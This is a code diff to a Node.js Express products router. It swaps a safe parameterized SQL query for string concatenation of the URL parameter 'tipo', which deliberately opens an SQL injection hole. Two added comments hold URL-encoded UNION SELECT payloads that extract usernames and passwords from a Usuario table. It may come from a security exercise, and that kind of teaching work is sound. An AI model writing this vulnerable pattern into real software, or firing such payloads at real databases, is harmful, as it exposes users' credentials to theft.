@@ -54,9 +54,14 @@ function createRouterProductos(db) {
   });
 
   router.get('/productos/tipo/:tipo', function (req, res, next) {
+    tipo = req.params.tipo
+    console.log(tipo)
+    query = "SELECT * FROM ProductoOfertado WHERE tipo='" + tipo
+    // Postre'%20UNION%20SELECT%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cusername%2Ccontrasena%20FROM%20Usuario;--
+    // Postre'%20UNION%20SELECT%20%2A%20FROM%20Usuario;--
     db.query(
-      'SELECT * FROM ProductoOfertado WHERE tipo=?',
-      [req.params.tipo],
+      query,
+      [],
       (error, results) => {
         if (error) {
           console.log(error);
